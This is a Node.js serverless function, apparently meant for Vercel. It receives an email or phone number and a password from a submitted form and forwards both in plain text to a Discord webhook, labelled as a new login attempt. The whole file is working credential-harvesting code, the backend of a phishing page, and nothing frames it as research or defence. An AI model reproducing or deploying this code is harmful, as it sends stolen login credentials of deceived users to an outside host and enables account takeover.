module.exports = async (req, res) => {
    const { emailOrPhone, password } = req.body;
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL; // Set in Vercel environment variables

    if (!emailOrPhone || !password) {
        return res.status(400).json({ error: 'Missing emailOrPhone or password' });
    }

    const payload = {
        content: `New login attempt:\n**Email/Phone**: ${emailOrPhone}\n**Password**: ${password}`
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Webhook request failed: ${response.statusText}`);
        }

        res.status(200).json({ message: 'Data sent to webhook' });
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Failed to send to webhook' });
    }
};
